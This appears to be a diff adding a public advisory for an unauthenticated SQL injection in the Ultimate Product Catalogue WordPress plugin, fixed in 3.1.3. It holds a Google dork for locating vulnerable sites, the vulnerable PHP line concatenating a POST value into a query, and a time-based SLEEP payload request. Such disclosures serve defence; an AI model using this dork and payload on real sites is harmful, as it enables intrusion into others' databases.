@@ -1,0 +1,51 @@
+# Exploit Title: Unauthenticated SQLi in Item_ID POST parameter on Ultimate
+Product Catalogue wordpress plugin
+# Google Dork: inurl:"SingleProduct" intext:"Back to catalogue"
+intext:"Category",
+inurl:"/wp-content/plugins/ultimate-product-catalogue/product-sheets/"
+# Date: 22/04/2015
+# Exploit Author: Felipe Molina de la Torre (@felmoltor)
+# Vendor Homepage: https://wordpress.org/plugins/ultimate-product-catalogue/
+# Software Link:
+https://downloads.wordpress.org/plugin/ultimate-product-catalogue.3.1.2.zip
+# Version: < 3.1.2, Comunicated and Fixed by the Vendor in 3.1.3
+# Tested on: Linux 2.6, PHP 5.3 with magic_quotes_gpc turned off, Apache
+2.4.0 (Ubuntu)
+# CVE : Requested to mitre but not assigned yet
+# Category: webapps
+
+1. Summary:
+
+    Ultimate Product Catalogue is a responsive and easily customizable
+plugin for all your product catalogue needs. It has +59.000 downloads,
++3.000 active installations.
+
+    Unauthenticated SQL injection in ajax call when the plugin is counting
+the times a product is being seen by the web visitors. The vulnerable POST
+parameter is "Item_ID".
+
+2. Vulnerability timeline:
+- 22/04/2015: Identified in version 3.1.2
+- 22/04/2015: Comunicated to developer company etoilewebdesign.com
+- 22/04/2015: Response from etoilewebdesign.com and fixed version in 3.1.3
+3. Vulnerable code:
+
+    In file Functions/Process_Ajax.php line 67:
+ [...]
+$Item_ID = $_POST['Item_ID'];
+        $Item = $wpdb->get_row("SELECT Item_Views FROM $items_table_name
+WHERE Item_ID=" . $Item_ID);
+[...]
+
+3. Proof of concept:
+
+    POST /wp-admin/admin-ajax.php HTTP/1.1
+  Host: <wordpress host>
+  [...]
+  Cookie: wordpress_f305[...]
+
+  Item_ID=2 AND SLEEP(5)&action=record_view
+
+4. Solution:
+
+    Update to version 3.1.3
